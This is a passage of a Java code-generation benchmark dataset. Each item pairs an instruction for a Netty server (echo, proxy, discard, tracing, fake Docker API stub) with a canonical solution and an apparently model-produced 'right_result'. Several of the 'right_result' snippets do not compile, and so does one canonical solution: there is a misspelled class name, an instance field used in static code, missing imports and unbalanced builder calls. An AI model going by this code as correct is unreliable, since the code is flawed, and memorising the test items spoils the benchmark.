    "Canonical_solution": "import brave.Tracing;\nimport brave.baggage.BaggagePropagation;\nimport brave.baggage.BaggagePropagationConfig.SingleBaggageField;\nimport brave.propagation.B3Propagation;\nimport brave.sampler.Sampler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelDuplexHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.AttributeKey;\nimport java.net.InetSocketAddress;\n\npublic class NettyHttpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public int startServer() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.option(ChannelOption.SO_BACKLOG, 1024);\n        b.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(final Channel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(new TracingDispatchHandler());\n                    p.addLast(new HelloWorldHandler());\n                }\n            });\n\n        Channel ch = b.bind(0).sync().channel();\n        return ((InetSocketAddress) ch.localAddress()).getPort();\n    }\n\n    public void stopServer() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n\n    static class TracingDispatchHandler extends ChannelDuplexHandler {\n        static final AttributeKey<String> URI_ATTRIBUTE = AttributeKey.valueOf(\"uri\");\n\n        final ChannelDuplexHandler unsampled = NettyHttpTracing.create(\n            Tracing.newBuilder().sampler(Sampler.NEVER_SAMPLE).build()\n        ).serverHandler();\n        final ChannelDuplexHandler traced = NettyHttpTracing.create(\n            Tracing.newBuilder()\n                .propagationFactory(BaggagePropagation.newFactoryBuilder(B3Propagation.FACTORY)\n                .build()\n        ).serverHandler();\n\n        @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (!(msg instanceof HttpRequest)) {\n                ctx.fireChannelRead(msg);\n                return;\n            }\n            String uri = ((HttpRequest) msg).uri();\n            if (\"/unsampled\".equals(uri)) {\n                ctx.channel().attr(URI_ATTRIBUTE).set(uri);\n                unsampled.channelRead(ctx, msg);\n            } else if (\"/traced\".equals(uri)) {\n                ctx.channel().attr(URI_ATTRIBUTE).set(uri);\n                traced.channelRead(ctx, msg);\n            } else {\n                ctx.fireChannelRead(msg);\n            }\n        }\n\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise prm) throws Exception {\n            String uri = ctx.channel().attr(URI_ATTRIBUTE).get();\n            if (uri == null) {\n                ctx.write(msg, prm);\n                return;\n            }\n            if (\"/unsampled\".equals(uri)) {\n                unsampled.write(ctx, msg, prm);\n            } else if (\"/traced\".equals(uri)) {\n                traced.write(ctx, msg, prm);\n            } else {\n                ctx.write(msg, prm);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.opentelemetry.api.GlobalOpenTelemetry;\nimport io.opentelemetry.api.trace.Span;\nimport io.opentelemetry.api.trace.Tracer;\nimport io.opentelemetry.context.Context;\nimport io.opentelemetry.context.Scope;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class NettyHttpServer {\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private int port;\n\n    public int startServer() throws Exception {\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<>() {\n                        @Override\n                        protected void initChannel(Channel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new HttpObjectAggregator(65536));\n                            pipeline.addLast(new TracingDispatchHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(0).sync();\n            InetSocketAddress address = (InetSocketAddress) f.channel().localAddress();\n            port = address.getPort();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n        return port;\n    }\n\n    public void stopServer() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private class TracingDispatchHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        private final Tracer tracer = GlobalOpenTelemetry.getTracer(\"NettyHttpServer\");\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest req) throws Exception {\n            String uri = req.uri();\n            Span span = null;\n            Scope scope = null;\n\n            if (\"/traced\".equals(uri)) {\n                span = tracer.spanBuilder(\"HandleTracedRequest\").startSpan();\n                scope = Context.current().with(span).makeCurrent();\n            }\n\n            try {\n                ByteBuf content = Unpooled.copiedBuffer(\"Hello from \" + uri, \"UTF-8\");\n                FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1,\n                        HttpResponseStatus.OK, content);\n                response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain; charset=UTF-8\");\n                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, content.readableBytes());\n\n                if (span != null) {\n                    span.setAttribute(\"uri\", uri);\n                }\n\n                ctx.writeAndFlush(response);\n            } finally {\n                if (span != null) {\n                    span.end();\n                    scope.close();\n                }\n            }\n        }\n\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {\n            if (msg instanceof FullHttpResponse) {\n                FullHttpResponse res = (FullHttpResponse) msg;\n                if (res.status().code() == 200) {\n                    String content = res.content().toString(io.netty.util.CharsetUtil.UTF_8);\n                    System.out.println(\"Outgoing Response: \" + content);\n                }\n            }\n            super.write(ctx, msg, promise);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and echo back received messages.\n\nClass Description: The EchoServer class is a Netty-based TCP server that listens on a specified port, accepts client connections, and echoes back any received messages. It uses Netty's event-driven architecture for efficient network communication.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n\nMethods:\n- EchoServer(int port) -> Constructor - Initializes the server with the specified port number\n- start() -> void - Starts the server, binds to the specified port, and begins accepting connections. Handles server shutdown gracefully when stopped. Throws Exception if any error occurs during startup or operation",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class EchoServer {\n    private final int port;\n\n    public EchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        final EchoServerHandler serverHandler = new EchoServerHandler();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b = b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(serverHandler);\n                        }\n                    });\n            ChannelFuture f = b.bind().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully().sync();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class EchoServer {\n    private final int port;\n\n    public EchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ch.pipeline().addLast(new EchoServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 229,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle proxy server functionality, including SSL/TLS support, message encoding/decoding, and idle connection management.\n\nClass Description: ProxyServerContainer is a Netty-based TCP server container that manages proxy server operations. It handles client connections, processes proxy messages, and manages server resources. The class includes SSL/TLS support, custom message handlers, and graceful shutdown capabilities.\n\nAttributes:\n- serverWorkerGroup: [NioEventLoopGroup] - Handles I/O operations and other tasks for accepted connections\n- serverBossGroup: [NioEventLoopGroup] - Accepts incoming connections and assigns them to worker group\n- logger: [Logger] - SLF4J logger instance for logging server events and errors\n\nMethods:\n- ProxyServerContainer() -> [void] - Constructor that initializes the event loop groups\n- start() -> [void] - Starts the proxy server by binding to configured host/port and setting up channel pipeline\n- stop() -> [void] - Shuts down the server gracefully by releasing all resources\n- createSslHandler(SSLContext sslContext, boolean needsClientAuth) -> [ChannelHandler] - Creates SSL handler for secure communication (input: SSLContext for security configuration, boolean for client auth requirement; output: configured SSL handler)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport org.fengfei.lanproxy.server.config.ProxyConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ProxyServerContainer {\n\n    private static final Logger logger = LoggerFactory.getLogger(ProxyServerContainer.class);\n\n    private NioEventLoopGroup serverWorkerGroup;\n    private NioEventLoopGroup serverBossGroup;\n\n    public ProxyServerContainer() {\n        serverBossGroup = new NioEventLoopGroup();\n        serverWorkerGroup = new NioEventLoopGroup();\n    }\n\n    public void start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(serverBossGroup, serverWorkerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new ProxyMessageDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, \n                                LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                        pipeline.addLast(new ProxyMessageEncoder());\n                        pipeline.addLast(new IdleCheckHandler(IdleCheckHandler.READ_IDLE_TIME, \n                                IdleCheckHandler.WRITE_IDLE_TIME, 0));\n                        pipeline.addLast(new ServerChannelHandler());\n                    }\n                });\n\n        try {\n            ChannelFuture future = bootstrap.bind(ProxyConfig.getInstance().getServerBind(), \n                    ProxyConfig.getInstance().getServerPort()).sync();\n            logger.info(\"proxy server start on port \" + ProxyConfig.getInstance().getServerPort());\n        } catch (InterruptedException ex) {\n            throw new RuntimeException(ex);\n        }\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext, boolean needsClientAuth) {\n        SSLEngine sslEngine = sslContext.createSSLEngine();\n        sslEngine.setUseClientMode(false);\n        if (needsClientAuth) {\n            sslEngine.setNeedClientAuth(true);\n        }\n        return new SslHandler(sslEngine);\n    }\n\n    public void stop() {\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.net.ssl.SSLEngine;\nimport java.util.concurrent.TimeUnit;\n\npublic class ProxyServerContainer {\n\n    private final NioEventLoopGroup serverBossGroup = new NioEventLoopGroup(1);\n    private final NioEventLoopGroup serverWorkerGroup = new NioEventLoopGroup();\n    private final Logger logger = LoggerFactory.getLogger(ProxyServerContainer.class);\n\n    public ProxyServerContainer() {\n        // Constructor initializes event loop groups\n    }\n\n    public void start() {\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(serverBossGroup, serverWorkerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<Channel>() {\n                        @Override\n                        protected void initChannel(Channel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n\n                            // Idle connection management: trigger close after 60s of inactivity\n                            pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(60, 0, 0, TimeUnit.SECONDS));\n\n                            // Add SSL handler if needed\n                            SslContext sslContext = getSslContext(); // Assume this is implemented elsewhere\n                            if (sslContext != null) {\n                                SSLEngine engine = sslContext.createSSLEngine();\n                                engine.setUseClientMode(false);\n                                engine.setNeedClientAuth(false); // Can be changed based on configuration\n                                pipeline.addLast(\"sslHandler\", new SslHandler(engine));\n                            }\n\n                            // Add custom message encoder/decoder and handlers\n                            pipeline.addLast(\"encoder\", new MessageEncoder());\n                            pipeline.addLast(\"decoder\", new MessageDecoder());\n                            pipeline.addLast(\"handler\", new ProxyMessageHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            // Bind to port and start accepting connections\n            ChannelFuture future = bootstrap.bind(8080).sync();\n            logger.info(\"Proxy server started on port 8080\");\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            logger.error(\"Error starting proxy server\", e);\n        }\n    }\n\n    public void stop() {\n        logger.info(\"Shutting down proxy server...\");\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n        logger.info(\"Proxy server shutdown complete.\");\n    }\n\n    public ChannelHandler createSslHandler(SslContext sslContext, boolean needsClientAuth) {\n        SSLEngine engine = sslContext.createSSLEngine();\n        engine.setUseClientMode(false);\n        engine.setNeedClientAuth(needsClientAuth);\n        return new SslHandler(engine);\n    }\n\n    // Placeholder for retrieving SSL context from external configuration\n    private SslContext getSslContext() {\n        // Implement logic to load SSL context\n        return null;\n    }\n\n    // Dummy classes for example purposes\n    private static class MessageEncoder extends MessageToByteEncoder<String> {\n        @Override\n        protected void encode(ChannelHandlerContext ctx, String msg, ByteBuf out) {\n            out.writeBytes(msg.getBytes());\n        }\n    }\n\n    private static class MessageDecoder extends ByteToMessageDecoder {\n        @Override\n        protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) {\n            byte[] bytes = new byte[in.readableBytes()];\n            in.readBytes(bytes);\n            out.add(new String(bytes));\n        }\n    }\n\n    private static class ProxyMessageHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            // Process the received message\n            System.out.println(\"Received message: \" + msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts client connections, and processes incoming data (discarding it in this example). It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- main: [main(String[] args)] -> void - Entry point that configures and starts the Netty server\n  - args: [String[]] - Command line arguments (not directly used)\n  - Throws: Exception - For various Netty and SSL related exceptions\n- initChannel: [initChannel(SocketChannel ch)] -> void - Initializes the channel pipeline for each new connection (inner method of ChannelInitializer)\n  - ch: [SocketChannel] - The socket channel being initialized\n  - Configures SSL handler (if enabled) and adds the main server handler to the pipeline",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class DiscardServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new DiscardServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class DiscardServer {\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    private final SslContext sslCtx;\n\n    public DiscardServer(SslContext sslCtx) {\n        this.sslCtx = sslCtx;\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (SSL) {\n            // For testing, generate a self-signed certificate\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     if (sslCtx != null) {\n                         ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\n\nclass DiscardServerHandler extends ChannelInboundHandlerAdapter {\n\n    @Override\n    public void channelRead(ChannelHandlerContext ctx, Object msg) {\n        ((ByteBuf) msg).release(); // Discard the received data\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 231,
    "Instruction": "Task Description: Create a Java class that implements a fake Docker server using Netty TCP server technology to intercept and record HTTP requests while responding with empty JSON responses.\n\nClass Description: The FakeDockerServer class simulates a Docker API server for testing purposes. It captures incoming HTTP requests and responds with a static JSON response. The server uses Netty's NIO event loop groups for handling connections and implements graceful shutdown capabilities.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- parent: NioEventLoopGroup - The parent event loop group for accepting connections\n- child: NioEventLoopGroup - The child event loop group for handling connections\n- requests: List<HttpRequest> - Stores all received HTTP requests for inspection\n- channel: Channel - The server's communication channel\n\nMethods:\n- FakeDockerServer(int port) -> None - Constructor that initializes the server with specified port\n- start() -> void - Starts the server and configures request handling pipeline\n- stop() -> void - Stops the server and releases resources gracefully\n- getRequests() -> List<HttpRequest> - Returns the list of captured HTTP requests",
    "Canonical_solution": "import com.github.dockerjava.api.DockerClient;\nimport com.github.dockerjava.core.DefaultDockerClientConfig;\nimport com.github.dockerjava.core.DockerClientBuilder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.CharsetUtil;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport static io.netty.handler.codec.http.HttpHeaderNames.CONTENT_LENGTH;\nimport static io.netty.handler.codec.http.HttpHeaderNames.CONTENT_TYPE;\nimport static io.netty.handler.codec.http.HttpResponseStatus.OK;\nimport static io.netty.handler.codec.http.HttpVersion.HTTP_1_1;\n\npublic class FakeDockerServer {\n    private final int port;\n    private final NioEventLoopGroup parent;\n    private final NioEventLoopGroup child;\n    private final List<HttpRequest> requests = new ArrayList<>();\n    private Channel channel;\n\n    public FakeDockerServer(int port) {\n        this.port = port;\n        this.parent = new NioEventLoopGroup();\n        this.child = new NioEventLoopGroup();\n    }\n\n    public void start() throws Exception {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(parent, child)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel socketChannel) throws Exception {\n                    ChannelPipeline pipeline = socketChannel.pipeline();\n                    pipeline.addLast(\"codec\", new HttpServerCodec());\n                    pipeline.addLast(\"httpHandler\", new SimpleChannelInboundHandler<Object>() {\n                        @Override\n                        protected void channelRead0(ChannelHandlerContext context, Object message) throws Exception {\n                            if (message instanceof HttpRequest) {\n                                HttpRequest request = (HttpRequest) message;\n                                requests.add(request);\n                            }\n\n                            if (message instanceof HttpContent) {\n                                FullHttpResponse response = new DefaultFullHttpResponse(HTTP_1_1, OK, Unpooled.copiedBuffer(\"{}\", CharsetUtil.UTF_8));\n                                response.headers().set(CONTENT_TYPE, \"application/json; charset=UTF-8\");\n                                response.headers().set(CONTENT_LENGTH, response.content().readableBytes());\n                                context.writeAndFlush(response);\n                            }\n                        }\n                    });\n                }\n            });\n\n        channel = bootstrap.bind(port).syncUninterruptibly().channel();\n    }\n\n    public void stop() throws Exception {\n        parent.shutdownGracefully();\n        child.shutdownGracefully();\n        channel.closeFuture().sync();\n    }\n\n    public List<HttpRequest> getRequests() {\n        return requests;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioserverSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.util.CharsetUtil;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class FakeDockerServer {\n    private final int port;\n    private final NioEventLoopGroup parent;\n    private final NioEventLoopGroup child;\n    private final List<HttpRequest> requests = new ArrayList<>();\n    private Channel channel;\n\n    public FakeDockerServer(int port) {\n        this.port = port;\n        this.parent = new NioEventLoopGroup();\n        this.child = new NioEventLoopGroup();\n    }\n\n    public void start() throws Exception {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(parent, child)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) {\n                 ChannelPipeline pipeline = ch.pipeline();\n                 pipeline.addLast(new HttpRequestDecoder());\n                 pipeline.addLast(new HttpResponseEncoder());\n                 pipeline.addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n                     @Override\n                     protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) {\n                         requests.add(msg);\n                         ByteBuf content = Unpooled.copiedBuffer(\"{}\", CharsetUtil.UTF_8);\n                         FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1,\n                                 HttpResponseStatus.OK, content);\n                         response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/json\");\n                         response.headers().set(HttpHeaderNames.CONTENT_LENGTH, content.readableBytes());\n                         ctx.writeAndFlush(response);\n                     }\n                 });\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        channel = b.bind(port).sync().channel();\n    }\n\n    public void stop() throws InterruptedException {\n        if (channel != null) {\n            channel.close().sync();\n        }\n        parent.shutdownGracefully();\n        child.shutdownGracefully();\n    }\n\n    public List<HttpRequest> getRequests() {\n        return requests;\n    }\n}\n```"
  },
  {
    "Task_id": 232,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that handles client connections and processes Protocol Buffers (protobuf) messages with support for idle connection detection and custom message handling.\n\nClass Description: ProtobufProxy is a Netty-based TCP server implementation that establishes a server socket, configures protocol buffer message handling, and manages client connections. It includes idle connection detection, protobuf message encoding/decoding, and custom business logic handlers.\n\nAttributes: None (This class doesn't maintain any instance attributes, using local variables within methods instead)\n\nMethods:\n1: start(int port) -> void - Initializes and starts the Netty TCP server on the specified port. Creates event loop groups, configures server bootstrap with protobuf handlers, binds to the port, and manages server lifecycle. The method blocks until server shutdown.\n   - Input Parameters:\n     - port: int - The TCP port number to bind the server to\n   - Output: None (void)",
